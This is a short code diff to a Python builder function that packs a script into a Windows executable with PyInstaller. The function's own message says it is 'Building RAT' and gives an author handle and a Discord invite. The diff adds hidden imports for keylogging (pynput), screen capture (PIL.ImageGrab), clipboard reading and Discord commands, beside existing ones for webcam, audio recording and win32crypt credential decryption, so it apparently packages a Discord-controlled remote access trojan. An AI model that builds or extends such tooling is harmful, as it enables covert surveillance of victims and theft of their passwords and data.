@@ -49,18 +49,26 @@ def create_exe(script_path, icon_path, output_name):
         '--hidden-import=aiohttp',
         '--hidden-import=cv2',
         '--hidden-import=discord',
+        '--hidden-import=discord.ext.commands',
         '--hidden-import=pyautogui',
+        '--hidden-import=pyperclip',
         '--hidden-import=pyaes',
         '--hidden-import=colorama',
         '--hidden-import=win32crypt',
+        '--hidden-import=pynput.keyboard',
         '--hidden-import=pynput.keyboard._win32',
+        '--hidden-import=pynput.mouse._win32',
         '--hidden-import=wave',
         '--hidden-import=sqlite3',
         '--hidden-import=sounddevice',
+        '--hidden-import=numpy',
+        '--hidden-import=PIL.Image',
+        '--hidden-import=PIL.ImageTk',
+        '--hidden-import=PIL.ImageGrab',
         '--hidden-import=pycryptodome',
-        '--hidden-import=pynput.mouse._win32',
         script_path
     ]
+    
 
     print("""Made by H-zz-H\nDiscord: _h_zz_h_ or https://discord.gg/29Ya4F3CgQ\nBuilding RAT. Please Wait. Can take up to 1 minute.""")
 
